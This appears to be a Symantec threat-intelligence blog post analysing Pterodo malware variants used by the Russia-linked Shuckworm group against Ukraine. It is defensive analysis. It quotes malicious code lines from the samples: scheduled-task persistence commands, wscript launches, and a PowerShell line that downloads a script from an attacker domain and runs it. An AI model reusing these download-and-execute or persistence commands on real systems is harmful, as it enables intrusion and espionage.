@@ -1,0 +1,54 @@
+<div><figure class="author__image"><img alt="" src="https://symantec-enterprise-blogs.security.com/sites/default/files/styles/blogs_author_avatar_small/public/2017-10/author-profile-default.jpg.webp?h=6386ac74&amp;itok=yMcB1DYB" style="max-width:80%;height:auto;width:auto;"/></figure>Threat Hunter TeamSymantec<a class="twitter" href="https://twitter.com/intent/tweet?text=Shuckworm%3A%20Espionage%20Group%20Continues%20Intense%20Campaign%20Against%20Ukraine&amp;url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fshuckworm-intense-campaign-ukraine" rel="noopener" target="_blank" title="Twitter">Twitter</a><a class="linkedin" href="https://www.linkedin.com/cws/share?url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fshuckworm-intense-campaign-ukraine&amp;token=&amp;isFramed=true" rel="noopener" target="_blank" title="LinkedIn">LinkedIn</a>SHAREPosted: 20 Apr, 20224 Min Read<a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence">Threat Intelligence</a>Follow<a href="https://twitter.com/threatintel" title="twitter">twitter</a><a href="https://www.linkedin.com/company/broadcomsoftware" title="linkedin">linkedin</a><h1 class="blog-post__title" id="page-title">Shuckworm: Espionage Group Continues Intense Campaign Against Ukraine</h1><h2 class="blog-post__subtitle">Russia-linked group is continually refining its malware and often deploying multiple payloads to maximize chances of maintaining a persistent presence on targeted networks.</h2><p>The Russian-linked Shuckworm espionage group (aka Gamaredon, Armageddon) is continuing to mount an intense cyber campaign against organizations in Ukraine.</p>
+<p>Shuckworm has almost exclusively focused its operations on Ukraine since it first appeared in 2014. These attacks have continued unabated since the Russian invasion of the country. While the group’s tools and tactics are simple and sometimes crude, the frequency and persistence of its attacks mean that it remains one of the key cyber threats facing organizations in the region.</p>
+<h2>Multiple payloads</h2>
+<p>One of the hallmarks of the group’s recent activity is the deployment of multiple malware payloads on targeted computers. These payloads are usually different variants of the same malware (Backdoor.Pterodo), designed to perform similar tasks. Each will communicate with a different command-and-control (C&amp;C) server.</p>
+<p>The most likely reason for using multiple variants is that it may provide a rudimentary way of maintaining persistence on an infected computer. If one payload or C&amp;C server is detected and blocked, the attackers can fall back on one of the others and roll out more new variants to compensate.</p>
+<p>Symantec’s Threat Hunter Team, part of <a href="https://software.broadcom.com/">Broadcom Software</a>, has found four distinct variants of Pterodo being used in recent attacks. All of them are Visual Basic Script (VBS) droppers with similar functionality. They will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a C&amp;C server. All of the embedded VBScripts were very similar to one another and used similar obfuscation techniques.</p>
+<h2>Backdoor.Pterodo.B</h2>
+<p>This variant is a modified self-extracting archive, containing obfuscated VBScripts in resources that can be unpacked by 7-Zip.</p>
+<p>It then adds them as a scheduled task to ensure persistence:</p>
+<ul>
+<li>CreateObject("Shell.Application").ShellExecute "SCHTASKS", "/CREATE /sc minute /mo 10 /tn " + """UDPSync"" /tr ""wscript.exe """ + hailJPT + """" &amp; " jewels //b joking //e VBScript joyful "" /F ", "" , "" , 0</li>
+<li>CreateObject("Shell.Application").ShellExecute "SCHTASKS", "/CREATE /sc minute /mo 10 /tn " + """SyncPlayer"" /tr ""wscript.exe """ + enormouslyAKeIXNE + """" + " jewels //b joking //e VBScript joyful "" /F ", "" , "" , 0</li>
+</ul>
+<p>The script also copies itself to [USERPROFILE]\ntusers.ini file.</p>
+<p>The two newly created files are more obfuscated VBScripts.</p>
+<ul>
+<li>The first is designed to gather system information, such as the serial number of the C: drive, and sends this information to a C&amp;C server.</li>
+<li>The second adds another layer of persistence by copying the previously dropped ntusers.ini file to another desktop.ini file.</li>
+</ul>
+<h2>Backdoor.Pterodo.C</h2>
+<p>This variant is also designed to drop VBScripts on the infected computer. When run, it will first engage in API hammering, making multiple meaningless API calls, which is presumably an attempt to avoid sandbox detection. It will then unpack a script and a file called offspring.gif to C:\Users\[username]\. It will call the script with:</p>
+<ul>
+<li>"wscript "[USERNAME]\lubszfpsqcrblebyb.tbi" //e:VBScript /w /ylq /ib /bxk //b /pgs"</li>
+</ul>
+<p>This script runs ipconfig /flushdns and executes the offspring.gif file. Offsprint.gif will download a PowerShell script from a random subdomain of corolain.ru and execute it:</p>
+<ul>
+<li>cvjABuNZjtPirKYVchnpGVop = "$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"</li>
+</ul>
+<h2>Backdoor.Pterodo.D</h2>
+<p>This variant is another VBScript dropper. It will create two files:</p>
+<ul>
+<li>[USERPROFILE]\atwuzxsjiobk.ql</li>
+<li>[USERPROFILE]\abide.wav</li>
+</ul>
+<p>It executes them with the following command:</p>
+<ul>
+<li>wscript "[USERPROFILE]\atwuzxsjiobk.ql" //e:VBScript /tfj /vy /g /cjr /rxia //b /pyvc</li>
+</ul>
+<p>Similar to the other variants, the first script will run ipconfig /flushdns before calling the second script and removing the original executable.</p>
+<p>The second script has two layers of obfuscation, but in the end it downloads the final payload from the domain declined.delivered.maizuko[.]ru and executes it.</p>
+<h2>Backdoor.Pterodo.E</h2>
+<p>The final variant is functionally very similar to variants B and C, engaging in API hammering before extracting two VBScript files to the user’s home directory. Script obfuscation is very similar to other variants.</p>
+<h2>Other tools</h2>
+<p>While the attackers have made heavy use of Pterodo during recent weeks, other tools have also been deployed alongside it. These include UltraVNC, an open-source remote-administration/remote-desktop-software utility. UltraVNC has previously been used by Shuckworm in multiple attacks.</p>
+<p>In addition to this, Shuckworm has also been observed using Process Explorer, a Microsoft Sysinternals tool designed to provide information about which handles and DLL processes have opened or loaded.</p>
+<h2>Persistent threat</h2>
+<p>While Shuckworm is not the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations. It appears that Pterodo is being continuously redeveloped by the attackers in a bid to stay ahead of detection.</p>
+<p>While Shuckworm appears to be largely focused on intelligence gathering, its attacks could also potentially be a precursor to more serious intrusions, if the access it acquires to Ukrainian organizations is turned over to other Russian-sponsored actors.</p>
+<h2>Protection/Mitigation</h2>
+<p>For the latest protection updates, please visit the <a href="https://www.broadcom.com/support/security-center/protection-bulletin">Symantec Protection Bulletin</a>.</p>
+<h2>Indicators of Compromise</h2>
+<p>A full list of IOCs is <a href="https://github.com/Symantec/threathunters/tree/main/Shuckworm">available here on GitHub</a>.</p>
+<p>If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.</p>
+<img alt="" src="https://symantec-enterprise-blogs.security.com/sites/default/files/styles/blogs_author_bio_small/public/2017-10/author-profile-default.jpg.webp?h=6386ac74&amp;itok=w8Rg1PQZ" style="max-width:80%;height:auto;width:auto;"/><h2 class="blog-author__title">About the Author</h2><h3 class="blog-author__name">Threat Hunter Team</h3><h4 class="blog-author__position">Symantec</h4><p>The Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.</p><h2 class="blog-post__comment-title">Want to comment on this post?</h2><p>We encourage you to share your thoughts on your favorite social platform.</p><a class="twitter" href="https://twitter.com/intent/tweet?text=Shuckworm%3A%20Espionage%20Group%20Continues%20Intense%20Campaign%20Against%20Ukraine&amp;url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fshuckworm-intense-campaign-ukraine" rel="noopener" target="_blank" title="Twitter">Twitter</a><a class="linkedin" href="https://www.linkedin.com/cws/share?url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fshuckworm-intense-campaign-ukraine&amp;token=&amp;isFramed=true" rel="noopener" target="_blank" title="LinkedIn">LinkedIn</a></div>
